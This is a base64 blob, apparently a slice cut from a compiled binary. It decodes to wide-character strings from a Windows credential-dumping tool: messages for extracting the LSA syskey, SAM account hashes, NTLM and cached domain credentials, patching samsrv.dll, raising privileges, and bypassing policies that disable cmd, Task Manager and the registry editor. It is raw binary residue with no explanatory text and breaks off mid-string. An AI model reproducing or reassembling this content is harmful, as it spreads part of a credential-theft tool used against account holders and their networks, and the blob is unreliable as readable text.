MAYQBjAGgAZQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAKABTAEUAQwBVAFIASQBUAFkAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAQwBvAG4AdAByAG8AbABTAGUAdAAwADAAMAAAAFMAZQBsAGUAYwB0AAAAAAAlADAAMwB1AAAAAAAlAHgAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFMAeQBzAGsAZQB5ACAAOwAgAEwAUwBBACAASwBlAHkAIABDAGwAYQBzAHMAIAByAGUAYQBkACAAZQByAHIAbwByAAoAAAAAAEQAbwBtAGEAaQBuACAAOgAgAAAAAAAAAEMAbwBuAHQAcgBvAGwAXABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBcAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAAAAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAAAAAACUAcwAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAEsATwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAHAAcgBlACAALQAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAEsATwAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAASwBPAAoAAABTAHkAcwBLAGUAeQAgADoAIAAAAEMAbwBuAHQAcgBvAGwAXABMAFMAQQAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBBAG4AZABTAHkAcwBrAGUAeQAgADsAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABTAHkAcwBrAGUAeQAgAEsATwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIABMAFMAQQAgAEsATwAKAAAAAABTAEEATQBcAEQAbwBtAGEAaQBuAHMAXABBAGMAYwBvAHUAbgB0AAAAVQBzAGUAcgBzAAAATgBhAG0AZQBzAAAACgBSAEkARAAgACAAOgAgACUAMAA4AHgAIAAoACUAdQApAAoAAAAAAFYAAABVAHMAZQByACAAOgAgACUALgAqAHMACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFUAcwBlAHIAcwBBAG4AZABTAGEAbQBLAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAVgAgAEsATwAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABVAHMAZQByAHMAQQBuAGQAUwBhAG0ASwBlAHkAIAA7ACAAcAByAGUAIAAtACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAFYAIABLAE8ACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFUAcwBlAHIAcwBBAG4AZABTAGEAbQBLAGUAeQAgADsAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABLAGUAIABLAE8ACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABVAHMAZQByAHMAQQBuAGQAUwBhAG0ASwBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAFMAQQBNACAAQQBjAGMAbwB1AG4AdABzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAE4AVABMAE0AAAAAAEwATQAgACAAAAAAACUAcwAgADoAIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEgAYQBzAGgAIAA7ACAAUgB0AGwARABlAGMAcgB5AHAAdABEAEUAUwAyAGIAbABvAGMAawBzADEARABXAE8AUgBEAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEgAYQBzAGgAIAA7ACAAUgB0AGwARQBuAGMAcgB5AHAAdABEAGUAYwByAHkAcAB0AEEAUgBDADQAAAAAAAoAUwBBAE0ASwBlAHkAIAA6ACAAAAAAAEYAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABTAGEAbQBLAGUAeQAgADsAIABSAHQAbABFAG4AYwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAQQBSAEMANAAgAEsATwAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABTAGEAbQBLAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAARgAgAEsATwAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABTAGEAbQBLAGUAeQAgADsAIABwAHIAZQAgAC0AIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAARgAgAEsATwAAAFAAbwBsAGkAYwB5AAAAAABQAG8AbABSAGUAdgBpAHMAaQBvAG4AAAAKAFAAbwBsAGkAYwB5ACAAcwB1AGIAcwB5AHMAdABlAG0AIABpAHMAIAA6ACAAJQBoAHUALgAlAGgAdQAKAAAAUABvAGwARQBLAEwAaQBzAHQAAABQAG8AbABTAGUAYwByAGUAdABFAG4AYwByAHkAcAB0AGkAbwBuAEsAZQB5AAAAAABMAFMAQQAgAEsAZQB5ACgAcwApACAAOgAgACUAdQAsACAAZABlAGYAYQB1AGwAdAAgAAAAIAAgAFsAJQAwADIAdQBdACAAAAAgAAAATABTAEEAIABLAGUAeQAgADoAIAAAAAAAUwBlAGMAcgBlAHQAcwAAAHMAZQByAHYAaQBjAGUAcwAAAAAACgBTAGUAYwByAGUAdAAgACAAOgAgACUAcwAAAF8AUwBDAF8AAAAAAEMAdQByAHIAVgBhAGwAAAAkAE0AQQBDAEgASQBOAEUALgBBAEMAQwAAAAAACgAqACoATgBUAEwATQAqACoAOgAgAAAACgBjAHUAcgAvAAAATwBsAGQAVgBhAGwAAAAAAAoAbwBsAGQALwAAAFMAZQBjAHIAZQB0AHMAXABOAEwAJABLAE0AXABDAHUAcgByAFYAYQBsAAAAQwBhAGMAaABlAAAATgBMACQASQB0AGUAcgBhAHQAaQBvAG4AQwBvAHUAbgB0AAAAAAAAACoAIABOAEwAJABJAHQAZQByAGEAdABpAG8AbgBDAG8AdQBuAHQAIABpAHMAIAAlAHUALAAgACUAdQAgAHIAZQBhAGwAIABpAHQAZQByAGEAdABpAG8AbgAoAHMAKQAKAAAAAAAqACAARABDAEMAMQAgAG0AbwBkAGUAIAAhAAoAAAAAAAAAAAAqACAASQB0AGUAcgBhAHQAaQBvAG4AIABpAHMAIABzAGUAdAAgAHQAbwAgAGQAZQBmAGEAdQBsAHQAIAAoADEAMAAyADQAMAApAAoAAAAAAE4ATAAkAEMAbwBuAHQAcgBvAGwAAAAAAAoAWwAlAHMAIAAtACAAAABdAAoAUgBJAEQAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AE4ATABLAE0AUwBlAGMAcgBlAHQAQQBuAGQAQwBhAGMAaABlACAAOwAgAEMAcgB5AHAAdABEAGUAYwByAHkAcAB0ACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABDAHIAeQBwAHQAUwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABDAHIAeQBwAHQASQBtAHAAbwByAHQASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABSAHQAbABFAG4AYwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAUgBDADQAIAA6ACAAMAB4ACUAMAA4AHgACgAAAFUAcwBlAHIAIAAgACAAIAAgACAAOgAgACUALgAqAHMAXAAlAC4AKgBzAAoAAAAAAE0AcwBDAGEAYwBoAGUAVgAlAGMAIAA6ACAAAABPAGIAagBlAGMAdABOAGEAbQBlAAAAAAAAAAAAIAAvACAAcwBlAHIAdgBpAGMAZQAgACcAJQBzACcAIAB3AGkAdABoACAAdQBzAGUAcgBuAGEAbQBlACAAOgAgACUAcwAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZABlAGMAcgB5AHAAdABTAGUAYwByAGUAdAAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAUwBlAGMAcgBlAHQAIAB2AGEAbAB1AGUAIABLAE8ACgAAAHQAZQB4AHQAOgAgACUAdwBaAAAAaABlAHgAIAA6ACAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAF8AYQBlAHMAMgA1ADYAIAA7ACAAQwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAF8AYQBlAHMAMgA1ADYAIAA7ACAAQwByAHkAcAB0AEkAbQBwAG8AcgB0AEsAZQB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAHAAYQB0AGMAaAAAAFMAYQBtAFMAcwAAAHMAYQBtAHMAcgB2AC4AZABsAGwAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtAHIAcABjACAAOwAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQByAHAAYwAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABWAGUAcgB5AEIAYQBzAGkAYwBNAG8AZAB1AGwAZQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwBGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQByAHAAYwAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtAHIAcABjACAAOwAgAGsAdQBsAGwAXwBtAF8AcwBlAHIAdgBpAGMAZQBfAGcAZQB0AFUAbgBpAHEAdQBlAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAEQAbwBtAGEAaQBuACAAOgAgACUAdwBaACAALwAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AcgBwAGMAIAA7ACAAUwBhAG0ATABvAG8AawB1AHAASQBkAHMASQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AcgBwAGMAIAA7ACAAJwAlAHMAJwAgAGkAcwAgAG4AbwB0ACAAYQAgAHYAYQBsAGkAZAAgAEkAZAAKAAAAbgBhAG0AZQAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AcgBwAGMAIAA7ACAAUwBhAG0ATABvAG8AawB1AHAATgBhAG0AZQBzAEkAbgBEAG8AbQBhAGkAbgAgACUAMAA4AHgACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AcgBwAGMAIAA7ACAAUwBhAG0ARQBuAHUAbQBlAHIAYQB0AGUAVQBzAGUAcgBzAEkAbgBEAG8AbQBhAGkAbgAgACUAMAA4AHgACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQByAHAAYwAgADsAIABTAGEAbQBPAHAAZQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtAHIAcABjACAAOwAgAFMAYQBtAEMAbwBuAG4AZQBjAHQAIAAlADAAOAB4AAoAAAAAAAoAUgBJAEQAIAAgADoAIAAlADAAOAB4ACAAKAAlAHUAKQAKAFUAcwBlAHIAIAA6ACAAJQB3AFoACgAAAEwATQAgACAAIAA6ACAAAAAKAE4AVABMAE0AIAA6ACAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtAHIAcABjAF8AdQBzAGUAcgAgADsAIABTAGEAbQBRAHUAZQByAHkASQBuAGYAbwByAG0AYQB0AGkAbwBuAFUAcwBlAHIAIAAlADAAOAB4AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQByAHAAYwBfAHUAcwBlAHIAIAA7ACAAUwBhAG0ATwBwAGUAbgBVAHMAZQByACAAJQAwADgAeAAKAAAAAABhAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBuAGcAAAAAAGQAaQBzAGMAbwB2AGUAcgBpAG4AZwAAAGEAcwBzAG8AYwBpAGEAdABpAG4AZwAAAGQAaQBzAGMAbwBuAG4AZQBjAHQAZQBkAAAAAABkAGkAcwBjAG8AbgBuAGUAYwB0AGkAbgBnAAAAYQBkAF8AaABvAGMAXwBuAGUAdAB3AG8AcgBrAF8AZgBvAHIAbQBlAGQAAABjAG8AbgBuAGUAYwB0AGUAZAAAAG4AbwB0AF8AcgBlAGEAZAB5AAAAdwBpAGYAaQAAAAAAAAAAAFsAZQB4AHAAZQByAGkAbQBlAG4AdABhAGwAXQAgAFQAcgB5ACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUAIABhAGwAbAAgAG0AbwBkAHUAbABlAHMAIAB3AGkAdABoACAARABlAHQAbwB1AHIAcwAtAGwAaQBrAGUAIABoAG8AbwBrAHMAAABkAGUAdABvAHUAcgBzAAAASgB1AG4AaQBwAGUAcgAgAE4AZQB0AHcAbwByAGsAIABDAG8AbgBuAGUAYwB0ACAAKAB3AGkAdABoAG8AdQB0ACAAcgBvAHUAdABlACAAbQBvAG4AaQB0AG8AcgBpAG4AZwApAAAAAABuAGMAcgBvAHUAdABlAG0AbwBuAAAAAABUAGEAcwBrACAATQBhAG4AYQBnAGUAcgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAHcAaQB0AGgAbwB1AHQAIABEAGkAcwBhAGIAbABlAFQAYQBzAGsATQBnAHIAKQAAAAAAdABhAHMAawBtAGcAcgAAAAAAAABSAGUAZwBpAHMAdAByAHkAIABFAGQAaQB0AG8AcgAgACAAIAAgACAAIAAgACAAIAAoAHcAaQB0AGgAbwB1AHQAIABEAGkAcwBhAGIAbABlAFIAZQBnAGkAcwB0AHIAeQBUAG8AbwBsAHMAKQAAAAAAcgBlAGcAZQBkAGkAdAAAAEMAbwBtAG0AYQBuAGQAIABQAHIAbwBtAHAAdAAgACAAIAAgACAAIAAgACAAIAAgACgAdwBpAHQAaABvAHUAdAAgAEQAaQBzAGEAYgBsAGUAQwBNAEQAKQAAAAAAYwBtAGQAAABNAGkAcwBjAGUAbABsAGEAbgBlAG8AdQBzACAAbQBvAGQAdQBsAGUAAAAAAG0AaQBzAGMAAAAAAHcAbABhAG4AYQBwAGkAAABXbGFuT3BlbkhhbmRsZQAAV2xhbkNsb3NlSGFuZGxlAFdsYW5FbnVtSW50ZXJmYWNlcwAAV2xhbkdldFByb2ZpbGVMaXN0AABXbGFuR2V0UHJvZmlsZQAAV2xhbkZyZWVNZW1vcnkAAEsAaQB3AGkAQQBuAGQAQwBNAEQAAAAAAEQAaQBzAGEAYgBsAGUAQwBNAEQAAAAAAGMAbQBkAC4AZQB4AGUAAABLAGkAdwBpAEEAbgBkAFIAZQBnAGkAcwB0AHIAeQBUAG8AbwBsAHMAAAAAAEQAaQBzAGEAYgBsAGUAUgBlAGcAaQBzAHQAcgB5AFQAbwBvAGwAcwAAAAAAcgBlAGcAZQBkAGkAdAAuAGUAeABlAAAASwBpAHcAaQBBAG4AZABUAGEAcwBrAE0AZwByAAAAAABEAGkAcwBhAGIAbABlAFQAYQBzAGsATQBnAHIAAAAAAHQAYQBzAGsAbQBnAHIALgBlAHgAZQAAAGQAcwBOAGMAUwBlAHIAdgBpAGMAZQAAAAkAKAAlAHcAWgApAAAAAAAJAFsAJQB1AF0AIAAlAHcAWgAgACEAIAAAAAAAJQAtADMAMgBTAAAAIwAgACUAdQAAAAAACQAgACUAcAAgAC0APgAgACUAcAAAAAAAJQB3AFoAIAAoACUAdQApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AZABlAHQAbwB1AHIAcwBfAGMAYQBsAGwAYgBhAGMAawBfAHAAcgBvAGMAZQBzAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFAAYQB0AGMAaAAgAE8ASwAgAGYAbwByACAAJwAlAHMAJwAgAGYAcgBvAG0AIAAnACUAcwAnACAAdABvACAAJwAlAHMAJwAgAEAAIAAlAHAACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBnAGUAbgBlAHIAaQBjAF8AbgBvAGcAcABvAF8AcABhAHQAYwBoACAAOwAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoACAAKAAwAHgAJQAwADgAeAApAAoAAAAAACAAKgAgAAAAIAAvACAAJQBzACAALQAgACUAcwAKAAAACQB8ACAAJQBzAAoAAAAAAGcAcgBvAHUAcAAAAGwAbwBjAGEAbABnAHIAbwB1AHAAAAAAAG4AZQB0AAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAE8AcABlAG4ARABvAG0AYQBpAG4AIABCAHUAaQBsAHQAaQBuACAAKAA/ACkAIAAlADAAOAB4AAoAAAAKAEQAbwBtAGEAaQBuACAAbgBhAG0AZQAgADoAIAAlAHcAWgAAAAAACgBEAG8AbQBhAGkAbgAgAFMASQBEACAAIAA6ACAAAAAKACAAJQAtADUAdQAgACUAdwBaAAAAAAAKACAAfAAgACUALQA1AHUAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBMAG8AbwBrAHUAcABJAGQAcwBJAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEcAZQB0AEcAcgBvAHUAcABzAEYAbwByAFUAcwBlAHIAIAAlADAAOAB4AAAAAAAKACAAfABgACUALQA1AHUAIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEcAZQB0AEEAbABpAGEAcwBNAGUAbQBiAGUAcgBzAGgAaQBwACAAJQAwADgAeAAAAAAACgAgAHwAtAAlAC0ANQB1ACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBuAGUAdABfAHUAcwBlAHIAIAA7ACAAUwBhAG0AUgBpAGQAVABvAFMAaQBkACAAJQAwADgAeAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAE8AcABlAG4AVQBzAGUAcgAgACUAMAA4AHgAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBFAG4AdQBtAGUAcgBhAHQAZQBVAHMAZQByAHMASQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBuAGUAdABfAHUAcwBlAHIAIAA7ACAAUwBhAG0ATwBwAGUAbgBEAG8AbQBhAGkAbgAgACUAMAA4AHgAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEwAbwBvAGsAdQBwAEQAbwBtAGEAaQBuAEkAbgBTAGEAbQBTAGUAcgB2AGUAcgAgACUAMAA4AHgAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBFAG4AdQBtAGUAcgBhAHQAZQBEAG8AbQBhAGkAbgBzAEkAbgBTAGEAbQBTAGUAcgB2AGUAcgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEMAbwBuAG4AZQBjAHQAIAAlADAAOAB4AAoAAAAAAEEAcwBrACAAZABlAGIAdQBnACAAcAByAGkAdgBpAGwAZQBnAGUAAABkAGUAYgB1AGcAAABQAHIAaQB2AGkAbABlAGcAZQAgAG0AbwBkAHUAbABlAAAAAABwAHIAaQB2AGkAbABlAGcAZQAAAFAAcgBpAHYAaQBsAGUAZwBlACAAJwAlAHUAJwAgAE8ASwAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBpAHYAaQBsAGUAZwBlAF8AcwBpAG0AcABsAGUAIAA7ACAAUgB0AGwAQQBkAGoAdQBzAHQAUAByAGkAdgBpAGwAZQBnAGUAIAAoACUAdQApACAAJQAwADgAeAAKAAAAUgBlAHMAdQBtAGUAIABhACAAcAByAG8AYwBlAHMAcwAAAAAAcgBlAHMAdQBtAGUAAAAAAFMAdQBzAHAAZQBuAGQAIABhACAAcAByAG8AYwBlAHMAcwAAAHMAdQBzAHAAZQBuAGQAAABUAGUAcgBtAGkAbgBhAHQAZQAgAGEAIABwAHIAbwBjAGUAcwBzAAAAcwB0AG8AcAAAAAAAUwB0AGEAcgB0ACAAYQAgAHAAcgBvAGMAZQBzAHMAAABzAHQAYQByAHQAAABMAGkAcwB0ACAAaQBtAHAAbwByAHQAcwAAAAAAaQBtAHAAbwByAHQAcwAAAEwAaQBzAHQAIABlAHgAcABvAHIAdABzAAAAAABlAHgAcABvAHIAdABzAAAAUAByAG8AYwBlAHMAcwAgAG0AbwBkAHUAbABlAAAAAABUAHIAeQBpAG4AZwAgAHQAbwAgAHMAdABhAHIAdAAgACIAJQBzACIAIAA6ACAAAABPAEsAIAAhACAAKABQAEkARAAgACUAdQApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBzAHQAYQByAHQAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AYwByAGUAYQB0AGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAATgB0AFQAZQByAG0AaQBuAGEAdABlAFAAcgBvAGMAZQBzAHMAAAAAAE4AdABTAHUAcwBwAGUAbgBkAFAAcgBvAGMAZQBzAHMAAAAAAE4AdABSAGUAcwB1AG0AZQBQAHIAbwBjAGUAcwBzAAAAJQBzACAAbwBmACAAJQB1ACAAUABJAEQAIAA6ACAATwBLACAAIQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAG4AZQByAGkAYwBPAHAAZQByAGEAdABpAG8AbgAgADsAIAAlAHMAIAAwAHgAJQAwADgAeAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAbgBlAHIAaQBjAE8AcABlAHIAYQB0AGkAbwBuACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQBuAGUAcgBpAGMATwBwAGUAcgBhAHQAaQBvAG4AIAA7ACAAcABpAGQAIAAoAC8AcABpAGQAOgAxADIAMwApACAAaQBzACAAbQBpAHMAcwBpAG4AZwAAACUAdQAJACUAdwBaAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AYwBhAGwAbABiAGEAYwBrAFAAcgBvAGMAZQBzAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBjAGEAbABsAGIAYQBjAGsAUAByAG8AYwBlAHMAcwAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AbwBwAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAACgAlAHcAWgAAAAAACgAJACUAcAAgAC0APgAgACUAdQAAAAAACQAlAHUAAAAJACAAAAAAAAkAJQBwAAAACQAlAFMAAAAJAC0APgAgACUAUwAAAAAACgAJACUAcAAgAC0APgAgACUAcAAJACUAUwAgACEAIAAAAAAAJQBTAAAAAAAjACUAdQAAAEwAaQBzAHQAIABzAGUAcgB2AGkAYwBlAHMAAABSAGUAcwB1AG0AZQAgAHMAZQByAHYAaQBjAGUAAAAAAFMAdQBzAHAAZQBuAGQAIABzAGUAcgB2AGkAYwBlAAAAUwB0AG8AcAAgAHMAZQByAHYAaQBjAGUAAAAAAFIAZQBtAG8AdgBlACAAcwBlAHIAdgBpAGMAZQAAAAAAUwB0AGEAcgB0ACAAcwBlAHIAdgBpAGMAZQAAAFMAZQByAHYAaQBjAGUAIABtAG8AZAB1AGwAZQAAAAAAcwBlAHIAdgBpAGMAZQAAACUAcwAgACcAJQBzACcAIABzAGUAcgB2AGkAYwBlACAAOgAgAAAAAABPAEsACgAAAAAAAABFAFIAUgBPAFIAIABnAGUAbgBlAHIAaQBjAEYAdQBuAGMAdABpAG8AbgAgADsAIABTAGUAcgB2AGkAYwBlACAAbwBwAGUAcgBhAH